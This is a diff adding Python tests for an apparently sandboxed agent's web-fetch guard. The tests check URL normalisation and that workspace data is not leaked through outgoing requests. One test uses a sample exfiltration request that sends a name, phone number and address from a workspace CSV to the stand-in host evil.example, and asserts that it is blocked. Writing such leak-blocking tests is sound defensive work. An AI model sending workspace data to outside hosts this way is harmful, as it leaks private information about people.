@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 import os
+import sys
 from pathlib import Path
 from typing import Any
 
@@ -274,6 +275,31 @@ def test_web_calls_a_rerun_replaced_still_count(store: Store, tmp_path: Path, si
     toolbox = box(store, subtask, tmp_path, site)
     assert fetch(toolbox, "https://start.example/next").ok
     assert not fetch(toolbox, "https://free.example/any").ok  # still after the web
+
+
+def test_data_with_separators_and_hidden_files_are_caught(
+    store: Store, tmp_path: Path, site: Site
+) -> None:
+    subtask = claim(store, goal="read")
+    toolbox = box(store, subtask, tmp_path, site)
+    toolbox.workspace.write("people.csv", b"John Smith,555-1234,12 Main St\n")
+    assert not fetch(toolbox, "https://evil.example/?d=John Smith,555-1234,12 Main St").ok
+    if sys.platform == "win32" or os.geteuid() == 0:
+        return  # a file cannot be made unreadable here
+    secret = toolbox.workspace.root / "people.csv"
+    secret.chmod(0)
+    try:
+        refused = fetch(toolbox, "https://evil.example/?d=anything-at-all-here")
+        assert not refused.ok and "too big to check" in (refused.error or "")
+    finally:
+        secret.chmod(0o600)
+
+
+def test_one_spelling_of_escapes() -> None:
+    assert normal("https://a.example/Caf%c3%a9") == normal("https://a.example/Café")
+    assert normal("https://a.example/%7Euser") == normal("https://a.example/~user")
+    assert normal("https://a.example/a%2Fb") != normal("https://a.example/a/b")
+    assert normal("https://a.example/?q=a%26b") != normal("https://a.example/?q=a&b")
 
 
 def test_a_user_part_is_never_opened(store: Store, tmp_path: Path, site: Site) -> None:
